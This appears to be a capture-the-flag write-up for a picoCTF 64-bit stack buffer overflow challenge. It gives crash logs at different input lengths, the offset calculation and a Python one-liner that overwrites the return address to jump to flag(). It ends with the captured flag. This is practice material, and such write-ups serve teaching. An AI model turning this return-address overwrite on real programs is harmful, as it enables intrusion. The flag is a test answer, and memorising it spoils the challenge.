@@ -1,0 +1,78 @@
+Welcome to 64-bit. Give me a string that gets you the flag:
+
+< 64 = fine
+64 - 68 == segfault
+69 - 70 == segfault with control **
+71 == bus error
+72 == hang
+73 == segfault
+74 - 78 == segfault with control **
+> 78 == segfault
+
+
+x64 means vars are 64 bits (8 bytes)
+
+buffer = 64
+ret addr = 8
+base ptr = 8
+64 + 8 + 8 == 80
+
+trial and error: (locally)
+
+python -c "print 'a'*69" | ./vuln; dmesg | tail -1
+Welcome to 64-bit. Give me a string that gets you the flag:
+Segmentation fault (core dumped)
+[15589.028454] v[20154]: segfault at 6161616161 ip 000000000040084f sp 00007fff715f3ef0 error 4 in vuln[400000+1000]
+
+python -c "print 'a'*73" | ./vuln; dmesg | tail -1
+Welcome to 64-bit. Give me a string that gets you the flag:
+Segmentation fault (core dumped)
+[15463.613454] v[20102]: segfault at 0 ip 0000000000400077 sp 00007ffc81756330 error 6 in vuln[400000+1000]
+
+python -c "print 'a'*74" | ./vuln; dmesg | tail -1
+Welcome to 64-bit. Give me a string that gets you the flag:
+Segmentation fault (core dumped)
+[15468.798448] v[20107]: segfault at 6161 ip 0000000000006161 sp 00007ffe09bba500 error 14 in vuln[400000+1000]
+
+python -c "print 'a'*78" | ./vuln; dmesg | tail -1
+Welcome to 64-bit. Give me a string that gets you the flag:
+Segmentation fault (core dumped)
+[15955.499018] v[21126]: segfault at 616161616161 ip 0000616161616161 sp 00007ffd6dc0b920 error 14 in libc-2.23.so[7fb6c347c000+1c0000]
+
+
+flag() location
+
+0000000000400767 <flag>:
+
+\x67 \x07 \x40
+
+python -c "print 'a'*72 + '\x67' + '\x07' + '\x40'" | ./vuln; dmesg | tail -1
+Welcome to 64-bit. Give me a string that gets you the flag:
+'flag.txt' missing in the current directory!
+[16438.273170] traps: v[21333] trap stack segment ip:40084f sp:7ffee2446e20 error:0 in vuln[400000+1000]
+
+
+final input: (remote)
+
+the same exploit wont work on the server directly
+the addresses and offsets are different on the server
+
+using gdb on the serve
+
+(gdb) b main
+Breakpoint 1 at 0x4007ec
+(gdb) b vuln
+Breakpoint 2 at 0x4007d0
+(gdb) b flag
+Breakpoint 3 at 0x40076b
+(gdb) r
+
+
+slightly adjust offsets until it works
+
+python -c "print 'a'*72 + '\x68' + '\x07' + '\x40'" | ./vuln
+Welcome to 64-bit. Give me a string that gets you the flag:
+picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_cfe23f2b}
+Segmentation fault (core dumped)
+
+
